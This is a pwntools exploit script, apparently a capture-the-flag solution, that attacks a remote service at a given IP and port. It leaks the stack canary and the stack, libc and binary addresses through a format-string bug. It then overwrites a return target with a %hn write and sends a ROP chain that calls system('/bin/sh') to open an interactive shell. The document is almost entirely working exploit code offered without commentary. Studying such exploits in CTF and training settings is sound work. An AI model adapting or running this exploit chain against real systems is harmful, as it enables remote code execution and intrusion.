from pwn import *


NC = "nc 103.152.242.235 25201".split()

libc = ELF("./libc.so.6")
elf = context.binary = ELF("./pwn-2_patched")
r = remote(NC[1],NC[2])
pop_rdi = 0x2313

# r = process("./pwn-2_patched")

r.sendlineafter(b">> ", b"3")

for i in range(1,26):
    r.sendlineafter(b": ", f"%{i}$p".encode())
    r.recvuntil(b"> ")
    result = r.recvline(0)
    if i == 17:
        canary = eval(result)
    elif i == 1:
        stack = eval(result) + 9908
    elif i == 25:
        libc.address = eval(result) - 147587
    elif i == 14:
        elf.address = eval(result) - 8880
    print(result, i)
    r.sendlineafter(b": ", b"y")

# canary 17
# stack 1, offset = 
# libc 25, offset = 147587
stack += 84
value = (elf.address + 7921) & 0xffff
print(hex(value))
print(hex(canary))
print(hex(stack))
print(hex(libc.address))
print(hex(elf.address))


payload = f"%{value}c%10$hn".encode().ljust(16,b"a") + p64(stack)
r.sendlineafter(b": ", payload)
r.sendlineafter(b": ", b"n")

# gdb.attach(r)
# pause()

payload = p64(canary) * 15
payload += p64(elf.address+pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(elf.address+pop_rdi+1)
payload += p64(libc.sym.system)

r.sendline(payload)
# 0x0000556d41f3aef1

# r.sendlineafter(b": ", b"kuntul")
# gdb.attach(r)

r.interactive()